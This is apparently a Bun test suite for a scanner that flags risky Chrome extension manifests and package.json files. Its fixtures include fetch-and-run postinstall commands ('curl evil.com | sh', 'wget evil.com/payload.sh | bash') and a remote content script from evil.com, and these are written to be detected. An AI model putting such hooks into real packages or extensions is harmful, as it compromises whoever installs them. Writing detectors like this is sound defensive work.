import { describe, it, expect } from 'bun:test';
import { scanManifest } from './scan-manifest.js';

describe('scanManifest — chrome extension', () => {
  it('detects critical finding for <all_urls> + cookies + webRequest combo', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Evil Extension',
      version: '1.0',
      permissions: ['<all_urls>', 'cookies', 'webRequest'],
    });

    const result = scanManifest(manifest);

    expect(result.findings.length).toBeGreaterThan(0);
    const critical = result.findings.find(f => f.severity === 'critical');
    expect(critical).toBeDefined();
    expect(result.permissions_score).toBeGreaterThan(20);
    expect(result.dangerous_permissions).toContain('<all_urls>');
    expect(result.dangerous_permissions).toContain('cookies');
    expect(result.dangerous_permissions).toContain('webRequest');
  });

  it('returns low score and no findings for safe permissions', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Safe Extension',
      version: '1.0',
      permissions: ['storage', 'alarms'],
    });

    const result = scanManifest(manifest);

    expect(result.permissions_score).toBe(0);
    expect(result.dangerous_permissions).toHaveLength(0);
    expect(result.findings).toHaveLength(0);
  });

  it('detects high finding for CSP with unsafe-eval', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Eval Extension',
      version: '1.0',
      permissions: [],
      content_security_policy: "script-src 'self' 'unsafe-eval'; object-src 'self'",
    });

    const result = scanManifest(manifest, 'chrome_extension');

    const highFinding = result.findings.find(f => f.severity === 'high' && f.rule_id === 'MANIFEST-CSP-UNSAFE-EVAL');
    expect(highFinding).toBeDefined();
  });

  it('detects critical finding for content_script loading remote URL', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Remote Script Extension',
      version: '1.0',
      permissions: [],
      content_scripts: [
        {
          matches: ['<all_urls>'],
          js: ['https://evil.com/inject.js'],
        },
      ],
    });

    const result = scanManifest(manifest, 'chrome_extension');

    const critical = result.findings.find(f => f.severity === 'critical' && f.rule_id === 'MANIFEST-CONTENT-SCRIPT-REMOTE');
    expect(critical).toBeDefined();
  });

  it('detects medium finding for <all_urls> alone', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'AllUrls Extension',
      version: '1.0',
      permissions: ['<all_urls>'],
    });

    const result = scanManifest(manifest, 'chrome_extension');

    const medium = result.findings.find(f => f.severity === 'medium' && f.rule_id === 'MANIFEST-PERM-ALL-URLS');
    expect(medium).toBeDefined();
  });

  it('detects high finding for <all_urls> + cookies (no webRequest)', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Cookie Extension',
      version: '1.0',
      permissions: ['<all_urls>', 'cookies'],
    });

    const result = scanManifest(manifest, 'chrome_extension');

    const high = result.findings.find(f => f.severity === 'high' && f.rule_id === 'MANIFEST-PERM-COMBO-HIGH');
    expect(high).toBeDefined();
  });
});

describe('scanManifest — package.json', () => {
  it('detects critical finding for postinstall with curl', () => {
    const pkg = JSON.stringify({
      name: 'evil-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl evil.com | sh',
      },
      dependencies: {},
    });

    const result = scanManifest(pkg, 'package_json');

    const critical = result.findings.find(f => f.severity === 'critical' && f.rule_id === 'PKG-LIFECYCLE-SHELL');
    expect(critical).toBeDefined();
    expect(critical?.message).toContain('postinstall');
  });

  it('returns no findings for normal scripts', () => {
    const pkg = JSON.stringify({
      name: 'safe-pkg',
      version: '1.0.0',
      scripts: {
        build: 'tsc',
        test: 'bun test',
        postinstall: 'node setup.js',
      },
      dependencies: {
        lodash: '^4.17.21',
      },
    });

    const result = scanManifest(pkg, 'package_json');

    expect(result.findings).toHaveLength(0);
  });

  it('detects typosquatting for 1-char-off package name', () => {
    const pkg = JSON.stringify({
      name: 'my-app',
      version: '1.0.0',
      dependencies: {
        lodas: '^4.17.21',
      },
    });

    const result = scanManifest(pkg, 'package_json');

    const typo = result.findings.find(f => f.rule_id === 'PKG-TYPOSQUATTING');
    expect(typo).toBeDefined();
    expect(typo?.message).toContain('lodas');
  });
});

describe('scanManifest — auto-detection', () => {
  it('auto-detects chrome_extension from manifest_version key', () => {
    const manifest = JSON.stringify({
      manifest_version: 3,
      name: 'Test',
      version: '1.0',
      permissions: ['<all_urls>', 'cookies', 'webRequest'],
    });

    const result = scanManifest(manifest);
    expect(result.findings.some(f => f.severity === 'critical')).toBe(true);
  });

  it('auto-detects package_json from dependencies key', () => {
    const pkg = JSON.stringify({
      name: 'my-pkg',
      version: '1.0.0',
      dependencies: {},
      scripts: { postinstall: 'wget evil.com/payload.sh | bash' },
    });

    const result = scanManifest(pkg);
    expect(result.findings.some(f => f.rule_id === 'PKG-LIFECYCLE-SHELL')).toBe(true);
  });
});

describe('scanManifest — error handling', () => {
  it('returns error finding on invalid JSON', () => {
    const result = scanManifest('not valid json {{{');

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].rule_id).toBe('MANIFEST-INVALID-JSON');
    expect(result.permissions_score).toBe(0);
  });

  it('returns error finding when JSON is not an object', () => {
    const result = scanManifest(JSON.stringify([1, 2, 3]));

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].rule_id).toBe('MANIFEST-INVALID-JSON');
  });
});
